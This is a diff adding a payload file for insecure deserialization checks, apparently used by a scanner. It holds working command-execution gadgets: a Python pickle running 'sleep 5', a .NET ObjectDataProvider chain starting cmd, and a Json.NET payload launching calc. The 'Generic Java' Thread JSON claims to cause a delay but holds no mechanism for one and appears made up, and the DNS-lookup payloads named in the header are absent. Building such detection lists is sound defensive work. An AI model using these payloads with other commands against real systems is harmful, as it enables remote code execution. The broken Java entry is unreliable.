@@ -1,0 +1,17 @@
+# Payloads for Insecure Deserialization checks.
+# These are designed to cause a time delay or a DNS lookup if processed.
+# Generic Java (e.g., using sleep)
+{"@class":"java.lang.Thread", "name":"pwned", "daemon":true, "contextClassLoader":{}, "inheritedAccessControlContext":{}, "threadGroup":{}, "target":{"@class":"java.lang.Thread", "name":"pwned", "daemon":true, "contextClassLoader":{}, "inheritedAccessControlContext":{}, "threadGroup":{}, "target":null, "priority":5, "single_step":false, "eetop":0, "stillborn":false, "stackSize":0, "tid":0, "threadStatus":0, "group":null}, "priority":5, "single_step":false, "eetop":0, "stillborn":false, "stackSize":0, "tid":0, "threadStatus":0, "group":{"@class":"java.lang.ThreadGroup", "name":"pwned", "maxPriority":10, "parent":null, "threads":[], "groups":[]}}
+
+# Python Pickle (causes a sleep)
+cos\nsystem\n(S'sleep 5'\ntR.
+
+# .NET (Type-confused gadget chain - simplified concept)
+<dotNet><string>System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</string><member>ObjectInstance</member><params><string>System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</string><member>Start</member><params><string>cmd</string><string>/c "ping -n 6 127.0.0.1"</string></params></params></dotNet>
+
+# Common Java Magic Bytes (error-based)
+ACED0005
+rO0ABXNy
+
+# Common .NET JSON (error-based)
+{'$type': 'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 'MethodName': 'Start', 'MethodParameters':{'$type': 'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089', '$values':['cmd', '/c calc']}}
